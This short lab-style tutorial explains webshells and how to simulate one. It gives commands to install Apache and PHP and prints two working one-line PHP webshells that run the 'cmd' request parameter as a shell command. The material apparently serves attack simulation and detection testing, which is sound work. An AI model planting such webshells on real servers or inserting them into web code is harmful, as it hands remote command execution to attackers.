# Simulating Webshell Attacks

Webshells are a method of gaining shell access by exploiting web services over HTTP or HTTPS. For an attacker, this is a great avenue for access to a remote server, as web services are designed to be highly available and C2 traffic can blend along with standard website access. When a web server is configured with PHP and allows user uploads, performing a webshell attack can be relatively easy.

## Webserver Configuration

To configure the server, run the following commands to setup Apache and PHP:

```
sudo apt -y update && sudo apt -y install apache2 && sudo apt -y install php
```

Now, populate the web server with the webshell files within `/var/www/html`.

**get_shell.php**
```
<?=`$_GET[cmd]`?>
```

**post_shell.php**
```
<?=`$_POST[cmd]`?>
```

These scripts will pull out the parameter named `cmd` from the HTTP requests and execute it on the command line.